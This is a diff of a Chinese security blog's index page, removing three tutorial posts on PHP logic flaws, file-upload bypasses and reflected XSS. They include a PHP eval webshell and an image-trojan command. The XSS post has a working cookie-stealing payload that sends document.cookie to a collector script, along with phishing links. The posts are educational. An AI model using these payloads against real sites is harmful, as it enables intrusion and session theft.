-             <span id="/2018/04/17/逻辑处理漏洞/" class="leancloud_visitors" data-flag-title="逻辑处理漏洞">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-逻辑处理漏洞"><a href="#0x00-逻辑处理漏洞" class="headerlink" title="0x00 逻辑处理漏洞"></a>0x00 逻辑处理漏洞</h2><p>很多漏洞出现的原因是在代码编写的环节没有考虑到一些安全问题，由程序逻辑失误导致的，这里记录一下一些常见的逻辑处理漏洞。</p>
-<h2 id="0x01-in-array函数"><a href="#0x01-in-array函数" class="headerlink" title="0x01 in_array函数"></a>0x01 in_array函数</h2><p>in_array()函数是用来判断一个值是否在一个列表里面，一般用法如下：  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array(&apos;b&apos;,array(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;))</span><br></pre></td></tr></table></figure>
-<p>当我们php代码中这样写时：  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(in_array($_GET[&apos;id&apos;],array(1,2,3,4)))</span><br><span class="line">&#123;</span><br><span class="line">    $sql=&quot;select where id=&apos;&quot;.$_GET[&apos;id&apos;].&quot;&apos;&quot;;</span><br><span class="line">echo $sql;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>这段代码判断得到的参数id的值是否在array这个数组中，但是这里如果输入id=1’ union select <em> from user，in_array()函数会自动进行类型转换，就会认为这个输入参数类型转换之后是1，属于array数组中，就会执行select where id =’1’ union select </em> from user。</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/logic/logic01.png" alt=""></p>
-<h2 id="0x02-双等于和三等于"><a href="#0x02-双等于和三等于" class="headerlink" title="0x02 双等于和三等于"></a>0x02 双等于和三等于</h2><p>php中，双等于与三等于之间有一些区别，其中双等于在判断等于之前会先进行数据类型转换，而三等于则不会，所以在一些情况下，双等于会造成一些安全问题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump($_GET[&apos;var&apos;]==2);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>var_dump()函数用于输出变量结构、内容和类型，一般用于精确调试。  </p>
-<p>这里我们如果给出var=2abcd,就会返回bool(true),发现类型强制转换之后判断为true。</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/logic/logic02.png" alt=""></p>
-<h2 id="0x03-is-numeric函数"><a href="#0x03-is-numeric函数" class="headerlink" title="0x03 is_numeric函数"></a>0x03 is_numeric函数</h2><p>in_numeric()用来判断一个变量是否为数字，如果检查通过返回true，否则返回false</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(is_numeric($_GET[&apos;var&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $sql=&quot;insert into user values(&apos;user&apos;,&#123;$_GET[&apos;var&apos;]&#125;)&quot;;</span><br><span class="line">    echo $sql;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>这个函数存在一个问题，那就是当传入hex时直接通过并返回true，但是mysql中是可以通过hex编码代替明文的，如我们提交一个xss测试代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>对应的hex编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x3c7363726970743e616c6572742831293c2f7363726970743e</span><br></pre></td></tr></table></figure></p>
-<p>就会成功的将代码传入数据库。</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/logic/logic03.png" alt=""></p>
-<h2 id="0x04-订单支付漏洞"><a href="#0x04-订单支付漏洞" class="headerlink" title="0x04 订单支付漏洞"></a>0x04 订单支付漏洞</h2><p>在一些电商网站会出现的一些逻辑漏洞，主要是客户可以更改单价、总价、数量等，然后提交之后后台未作严格的校验导致的。</p>
-<p>比如价格可以在客户端提交，那么原本几千元的商品，我们抓包修改提交订单的商品单价为1，如果后台未作校验直接跳转支付界面，那么就可以用一元钱购买物品。总价也是同理。</p>
-<p>再比如将要购买的商品数量或单价改为负数，如果后台未作检验，那么计算总价时就会计算出负数，反而会让我们越买钱越多。</p>
-<h2 id="0x05-利用时间差"><a href="#0x05-利用时间差" class="headerlink" title="0x05 利用时间差"></a>0x05 利用时间差</h2><p>这种类型在早期刷钻的时候出现过，先发给腾讯一条开通某钻的订单，然后再发送一个取消业务的短信给运营商，这样腾讯那边成功开通但是无法扣费，就实现了刷钻。</p>
-<p>还有就是在购买商品时，判断余额这条语句和扣费语句之间有某几条语句浪费了一些时间。比如我们有10元钱，然后商品也是10元，我们就可以以极快的速度发很多个请求，这个时候还没用扣费所以判断余额10元足够开通，然后请求都发送之后，获得了很多个10元钱请求的商品，然后才开始扣费，使余额成为负数，但是商品已经全部成功买到。</p>
-<h2 id="0x06-水平权限漏洞"><a href="#0x06-水平权限漏洞" class="headerlink" title="0x06 水平权限漏洞"></a>0x06 水平权限漏洞</h2><p>水平越权，即是相同级别的用户或者同一角色的不同用户之间，可以越权访问修改或者删除等重要功能。  </p>
-<p>如果我们自己的页面最后的id是12300，如果设计者没有考虑到水平权限的问题再次验证用户访问的空间是否属于这个用户自身的话，那么就可以通过遍历来得到所有用户的信息，甚至进行修改等。</p>
-<h2 id="0x07-垂直权限漏洞"><a href="#0x07-垂直权限漏洞" class="headerlink" title="0x07 垂直权限漏洞"></a>0x07 垂直权限漏洞</h2><p>垂直越权就是低权限用户(普通用户)可以访问更高权限(如管理员)才能访问到的资源。  </p>
-<p>如之前淘宝举报号任意访问的问题，我们通过普通用户的身份，可以访问只有管理员才能访问的举报信息，就是这里的权限检查出现问题。</p>
-<h2 id="0x08-未授权访问"><a href="#0x08-未授权访问" class="headerlink" title="0x08 未授权访问"></a>0x08 未授权访问</h2><p>这个漏洞广泛存在于目前的网络中，很多公司都没有对自己公司的某些敏感目录做访问限制，使得外网可以直接通过浏览器访问。</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/logic/logic04.jpg" alt=""></p>
-<p>如正方教务系统的后台敏感日志查看漏洞</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/logic/logic05.png" alt=""></p>
-<p>我们在正方教务系统的登陆页面后面加上/log/2018-04-17-log.txt，就可以直接访问后台敏感日志。</p>
-<p>有的公司的files信息和phpinfo信息，也直接暴露给用户，会被获得很多敏感信息。</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/logic/logic06.jpg" alt=""></p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/logic/logic07.png" alt=""></p>
-<h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p>逻辑处理漏洞还有很多类型，比如验证码爆破、密码找回等等，这些漏洞虽然原理不难理解，但是由于程序员编写代码时的考虑不周，导致逻辑处理漏洞广泛存在，并且危害极高，解决逻辑处理漏洞，更需要的是安全工作人员和开发人员的沟通配合。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/12/文件上传漏洞绕过方式总结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/04/12/文件上传漏洞绕过方式总结/" itemprop="url">
-                  文件上传漏洞绕过方式总结
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-12T13:37:31+08:00">
-                2018-04-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/04/12/文件上传漏洞绕过方式总结/" class="leancloud_visitors" data-flag-title="文件上传漏洞绕过方式总结">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-文件上传漏洞"><a href="#0x00-文件上传漏洞" class="headerlink" title="0x00 文件上传漏洞"></a>0x00 文件上传漏洞</h2><p>在网站一些可以上传文件的地方，利用上传漏洞上传木马可以直接得到WEBSHELL，危害等级极高。上一篇文件上传漏洞的博客介绍了文件上传漏洞的原理和实战，这里来记录一些常见的绕过方法。</p>
-<h2 id="0x01-绕过前端验证"><a href="#0x01-绕过前端验证" class="headerlink" title="0x01 绕过前端验证"></a>0x01 绕过前端验证</h2><p>我们都知道，任何基于前端的验证都是不安全的，因为用户能直接修改它进行绕过。</p>
-<p>如果在前端对上传文件的格式进行了限制，我们可以通过以下的办法进行绕过:</p>
-<ul>
-<li><p>禁用js<br>我们通过firefox中的一个插件NoScript，将脚本禁用，这个时候上传文件的时候就不会触发js校验。</p>
-</li>
-<li><p>修改可上传的文件类型<br>因为是基于前端的验证，所有代码我们都可以通过firebug来修改，只需要在允许的类型中加入我们的文件类型，或者在禁止的类型中删除我们的文件类型，提交即可饶过。</p>
-</li>
-<li><p>通过BurpSuite绕过<br>我们通过BurpSuite进行绕过时，首先将文件名后缀改成它允许的类型，然后通过了前端的检查之后截取这个包，将文件后缀再改回来，就成功的绕过了js检查。</p>
-</li>
-</ul>
-<h2 id="0x02-后端检测-MIME"><a href="#0x02-后端检测-MIME" class="headerlink" title="0x02 后端检测-MIME"></a>0x02 后端检测-MIME</h2><p>此类后端检查时，检查的是Content-Type，也叫Mime-Type，这个时候，我们上传一个PHP文件，通过BurpSuite抓包，将.php后缀的Content-Type: application/octet-stream更改为.jpg的Content-Type: image/jpeg。<br>然后发包，就可以绕过后端基于Content-Type的检测。</p>
-<h2 id="0x03-后端检测-文件头"><a href="#0x03-后端检测-文件头" class="headerlink" title="0x03 后端检测-文件头"></a>0x03 后端检测-文件头</h2><p>这个时候他会检测文件的16进制数据头是否是合法文件的数据头，这个时候我们找一个普通的图片文件，再写一个一句话木马文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[123456])?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>然后通过前面隐写术的方法，进入两个文件的路径，在cmd中输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy/b 1.jpg+1.php 2.jpg</span><br></pre></td></tr></table></figure></p>
-<p>制作成图片马，即可通过菜刀连接一句话木马。</p>
-<h2 id="0x04-后端检测-黑名单"><a href="#0x04-后端检测-黑名单" class="headerlink" title="0x04 后端检测-黑名单"></a>0x04 后端检测-黑名单</h2><p>对于黑名单的检测方式，我们有如下几种办法绕过：</p>
-<ul>
-<li>后缀名大小写混用<br>假如.php后缀，我们可以写成.PHp之类的形式，用于一些过滤不严谨的系统。</li>
-<li>双写后缀<br>在一些系统中，仅仅匹配非法后缀删除，这个时候我们构造.pphphp，当它将第一个php匹配删除之后，剩下的字符又重新组合成了.php。</li>
-<li>同义后缀名<br>很多文件的后缀名不止一个，一些不常用的后缀名如果没有加入黑名单，就可以通过其他的同义后缀绕过。</li>
-</ul>
-<h2 id="0x05-后端检测-iis解析漏洞"><a href="#0x05-后端检测-iis解析漏洞" class="headerlink" title="0x05 后端检测-iis解析漏洞"></a>0x05 后端检测-iis解析漏洞</h2><p>在iis6中，如果提交图片格式为1.asp;.jpg，后缀是jpg可以绕过检测，然后在上传后就会被解析成asp格式的文件，这个时候通过上面的办法制作图片马，然后上传后通过菜刀连接上传后的图片马即可。</p>
-<h2 id="0x06-目录禁止执行"><a href="#0x06-目录禁止执行" class="headerlink" title="0x06 目录禁止执行"></a>0x06 目录禁止执行</h2><p>在一些存放上传文件的目录，禁止执行脚本，这个时候我们可以通过在这个目录创建新的子目录，然后将脚本写入子目录中，即可执行。</p>
-<h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>文件上传漏洞带来的危害十分巨大，在有文件上传的位置，一定要做严格的检查，不能因为开发一时的方便而忽视危害，建议在开发时遵循如下几点：</p>
-<ul>
-<li>1.应用白名单的方式过滤文件扩展名</li>
-<li>2.使用三等于（===）来对比扩展名（防止类型转换带来的逻辑漏洞，之后写逻辑漏洞的时候会写到）</li>
-<li>3.如果不是图片等必要呈现出来的文件，对上传路径设置权限。</li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/04/跨站脚本攻击XSS/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/04/04/跨站脚本攻击XSS/" itemprop="url">
-                  跨站脚本攻击XSS
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-04T23:47:04+08:00">
-                2018-04-04
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/04/04/跨站脚本攻击XSS/" class="leancloud_visitors" data-flag-title="跨站脚本攻击XSS">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-XSS"><a href="#0x00-XSS" class="headerlink" title="0x00 XSS"></a>0x00 XSS</h2><p>XSS，跨站脚本攻击(Cross Site Scripting)，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。比如获取用户Cookie，会话劫持，钓鱼欺骗等多种攻击。  </p>
-<h2 id="0x01-XSS的原理"><a href="#0x01-XSS的原理" class="headerlink" title="0x01 XSS的原理"></a>0x01 XSS的原理</h2><p>XSS的原理其实也就是上面所说，恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。<br>HTML的script元素标记中间包含JavaScript，当浏览器遇到这一标记时，它不会将其内容处理成HTML或者XHTML，而是把对于其内容的控制权移交给另一个内置的浏览器代理——脚本处理引擎。又，Web浏览器本身的设计是不安全的，它只负责解释和执行JavaScript等脚本语言，而不会判断代码是否有害。  </p>
-<h2 id="0x02-XSS的危害"><a href="#0x02-XSS的危害" class="headerlink" title="0x02 XSS的危害"></a>0x02 XSS的危害</h2><p>XSS在OWASP中一直占据着前十的地位，虽然表面上XSS不像sql注入、文件上传之类的漏洞一样直接可以获得很高的权限，但是因为xss漏洞广泛存在于各类网站之中，运用起来灵活多变，所以深受黑客偏爱。<br>它的常见危害有：</p>
-<ul>
-<li>（1）网络钓鱼，盗取各类用户的账号</li>
-<li>（2）窃取用户Cookie，获取用户隐私，或者利用用户身份进一步执行操作</li>
-<li>（3）劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账、强制发表日志等</li>
-<li>（4）强制弹出广告页面，刷流量等</li>
-<li>（5）传播木马</li>
-</ul>
-<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>首先我们要搭建漏洞环境，这里我们可以选用之前博客中提到的的LAMP环境，也可以搭建一个wamp环境，这里为了方便，我就在windows下搭建环境测试了，首先我们在wamp的www/xss文件夹下新建test.php,然后输入如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;title&gt;XSS test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;xss_input&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">setcookie(&apos;cookie&apos;,&apos;test&apos;);</span><br><span class="line">$xss = $_GET[&apos;xss_input&apos;];</span><br><span class="line">echo &apos;your input is:&lt;br&gt;&apos;.$xss;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
-<p>然后保存并打开wamp服务  </p>
-<p>通过浏览器访问127.0.0.1/xss/test.php来访问刚才创建的页面,</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/xss/xss01.jpg" alt=""></p>
-<p>我们在输入框输入<script>alert(‘xss’)</script>，点击提交，发现出现有如下图的xss的弹窗，此时环境搭建完成。  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/xss/xss02.jpg" alt=""></p>
-<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>如果只是控制弹窗，我们并不能直观的看到它的危害，下来我们尝试利用xss漏洞，看看能做到什么程度。<br>XSS最经常使用的就是获取Cookie了，攻击者通常利用网站的xss漏洞向页面写入窃取Cookie信息的代码，在用户浏览网页时，攻击者就会获取受害者当前浏览器中的Cookie信息。此时攻击者可以将Cookie信息向服务器提交，然后以受害者的身份登陆网站。<br>我们尝试一个最简单的反射型xss获取用户cookie。<br>我们先在自己的远程服务器上写一个php页面和一个js脚本来接收Cookie并保存：<br>hk.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cookie = $_GET[&quot;q&quot;];</span><br><span class="line">$log = fopen(&quot;cookie.txt&quot;, &quot;a&quot;);</span><br><span class="line">fwrite($log, $cookie . &quot;\n&quot;);</span><br><span class="line">fclose($log);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>这段代码的作用是读取q的值，然后以增加的方式打开cookie.txt，然后将读取到的值写入cookie.txt。</p>
-<p>然后我们在漏洞页面构造如下xss：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var x=new Image();x.src=&quot;http://127.0.0.1/xss/hk/hk.php?q=&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>然后我们发现，cookie.txt中，已经有我们刚才页面的cookie了</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/xss/xss03.jpg" alt=""></p>
-<p>并且查看源代码，发现源代码中有这样一句javascript</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/xss/xss04.png" alt=""></p>
-<p>这个时候，如果把下面链接发送给别人，别人点到就可以获取它的cookie了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss/test.php?xss_input=%3Cscript%3Evar+x%3Dnew+Image%28%29%3Bx.src%3D%22http%3A%2F%2F127.0.0.1%2Fxss%2Fhk%2Fhk.php%3Fq%3D%22%2Bdocument.cookie%3B%3C%2Fscript%3E</span><br></pre></td></tr></table></figure></p>
-<p>虽然这样可以达成效果，但是我们发现，恶意代码都明明显显的写到url中了，很少会有人上当，而且url长度太长，遇到某些不能输入这么长js脚本的输入框怎么办？</p>
-<p>所以就有了一个更好的解决办法，那就是将js脚本写到自己的服务器中，在搜索框中只需要调用咱们自己服务器上面的脚本就可以了。</p>
-<p>我们在自己服务器中和刚才的hk.php同路径创建一个hk.js</p>
-<p>hk.js:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var x=new Image();</span><br><span class="line">x.src=&quot;http://127.0.0.1/xss/hk/hk.php?q=&quot;+document.cookie;</span><br></pre></td></tr></table></figure></p>
-<p>然后在漏洞界面写入如下xss：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src = http://127.0.0.1/xss/hk/hk.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>发现结果cookie.txt多了一行</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/xss/xss05.jpg" alt=""></p>
-<p>并且源码中的javascript如下</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/xss/xss06.png" alt=""></p>
-<p>然后我们构造一个链接来欺骗用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss/test.php?xss_input=%3Cscript+src+%3D+http%3A%2F%2F127.0.0.1%2Fxss%2Fhk%2Fhk.js%3E%3C%2Fscript%3E</span><br></pre></td></tr></table></figure></p>
-<p>只要用户点击此链接，cookie就会被记录到我们服务器上的cookie.txt里面。</p>
-<p>以上就是一次反射性xss最简单的利用方式。</p>
-<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>xss漏洞因为其危害不直观，往往不受到重视，但是它的运用十分灵活，绕过方式也和sql注入一样十分丰富，在有些时候可以达到意想不到的效果。<br>这次暂时就写到这里，下一篇关于xss的博客会详细的介绍xss的一些绕过检测和限制的方式，还有利用xss进行网络钓鱼以及网页挂马的方法。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -2418,7 +2492,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">40</span>
+                <span class="site-state-item-count">43</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2440,7 +2514,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">38</span>
+                <span class="site-state-item-count">40</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
